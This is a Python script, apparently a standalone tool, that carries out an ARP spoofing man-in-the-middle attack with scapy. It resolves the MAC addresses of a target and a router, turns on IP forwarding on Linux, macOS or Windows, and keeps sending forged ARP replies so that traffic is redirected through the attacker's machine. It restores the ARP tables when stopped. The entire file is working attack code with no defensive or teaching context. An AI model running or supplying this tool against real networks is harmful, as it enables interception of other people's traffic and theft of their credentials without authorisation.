import scapy.all as scapy
import argparse as arg
import sys, os, time
import subprocess as sub

def get_arguments():
    """Get arguments from the command line"""
    parser = arg.ArgumentParser()
    parser.add_argument('-t', '--target', dest='target', help='The target IP Address')
    parser.add_argument('-r', '--router', dest='router', help='The router IP Address')
    options = parser.parse_args()
    if not options.target:
        options = None
    return options

def arp_spoofer(targetIP, routerIP):
    """Spoof the specified Target and Router"""
    sent_packets_counter = 0
    target_MAC = str(get_mac_address(targetIP))
    router_MAC = str(get_mac_address(routerIP)) 
    ip_forward_status(1)
    try:
        while True:
            spoof(targetIP, target_MAC, routerIP, router_MAC)
            sent_packets_counter += 1
            print_counter(sent_packets_counter)
            time.sleep(2)
    except KeyboardInterrupt:
        keyboard_interrupt_handler(targetIP, target_MAC, routerIP, router_MAC)

def spoof(targetIP, targetMAC, routerIP, routerMAC):
    """Send the spoofed packets"""
    packet_to_router = scapy.ARP(op=2, pdst=routerIP, hwdst=routerMAC, psrc=targetIP)
    packet_to_target = scapy.ARP(op=2, pdst=targetIP, hwdst=targetMAC, psrc=routerIP)
    scapy.send(packet_to_router, verbose=False)
    scapy.send(packet_to_target, verbose=False)

def restore(targetIP, targetMAC, routerIP, routerMAC):
    """Restore the network"""
    packet_to_router = scapy.ARP(op=2, pdst=routerIP, hwdst=routerMAC, psrc=targetIP, hwsrc=targetMAC)
    packet_to_target = scapy.ARP(op=2, pdst=targetIP, hwdst=targetMAC, psrc=routerIP, hwsrc=routerMAC)
    scapy.send(packet_to_router, count = 4, verbose=False)
    scapy.send(packet_to_target, count = 4, verbose=False)

def keyboard_interrupt_handler(targetIP, targetMAC, routerIP, routerMAC):
    """Handle the Keyboard Interrupt"""
    print("\n\n[!!] Detected CTRL + C. Closing ARP Spoofer...")
    print("\t[+] Restoring ARP Tables, waiting...")
    restore(targetIP, targetMAC, routerIP, routerMAC)
    print("\t[+] Disable IP forwarding, waiting...")
    ip_forward_status(0)
    print("\t[+] Restore Complete, quitting!")

def get_mac_address(ip):
    """Get the MAC address of the specified IP"""
    broadcast_layer = scapy.Ether(dst='ff:ff:ff:ff:ff:ff')
    arp_layer = scapy.ARP(pdst=ip)
    get_mac_packet = broadcast_layer/arp_layer
    answered_list = scapy.srp(get_mac_packet, timeout=2, verbose=False)[0]
    return answered_list[0][1].hwsrc

def ip_forward_status(status):
    if sys.platform.lower() in ['linux','linux2','darwin']:
        os.system(f'echo {str(status)} > /proc/sys/net/ipv4/ip_forward')
    elif sys.platform.lower() in ['windows', 'win32', 'win64']:
        ip_forwarding_Windows(status)

def ip_forwarding_Windows(status):
    """Enable/Disable IP forwarding for all interfaces in Windows 10"""
    interfaces = get_windows_interfaces()
    for interface in interfaces:
        if status == 1:
            sub.call(f'netsh interface ipv4 set interface {interface} forwarding="enabled"', shell=True, stdout=open(os.devnull, 'wb'))
        else:
            sub.call(f'netsh interface ipv4 set interface {interface} forwarding="disabled"', shell=True, stdout=open(os.devnull, 'wb'))
    
def get_windows_interfaces():
    """Get the list of all the IPv4 Windows interfaces"""
    interfaces = os.popen('netsh interface ipv4 show interfaces').read().strip().strip('\r')
    interfaces = interfaces.split('\n')
    interfaces.pop(0)
    interfaces.pop(0)
    list_interfaces = []
    for line in interfaces:
        list_interfaces.append(line.strip().split(' ')[0])
    return list_interfaces

def print_counter(counter):
    print(f'\r[+] Packets sent: {str(counter)} ', end="")  # PYTHON 3 Dynamic print
    sys.stdout.flush()        



if __name__ == '__main__':
    optionsValues = get_arguments()
    if optionsValues:
        target_IP = str(optionsValues.target)
        router_IP = str(optionsValues.router)
        arp_spoofer(target_IP, router_IP)
    else:
        target_IP = input('[>] Target IP Address: ')
        router_IP = input('[>] Router IP Address: ')
        arp_spoofer(target_IP, router_IP)